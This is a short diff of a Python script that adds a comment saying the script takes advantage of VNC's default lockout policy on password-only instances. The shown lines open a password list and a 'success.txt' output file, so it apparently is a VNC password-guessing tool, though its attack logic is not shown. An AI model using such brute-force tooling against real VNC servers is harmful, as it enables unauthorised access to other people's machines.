@@ -1,5 +1,7 @@
 import subprocess,time,sys
 
+# Script takes advantage of VNCs default lockout policy for password-only protected instances.
+
 f = open("pass.list","r")
 
 res_f = open("success.txt","w")
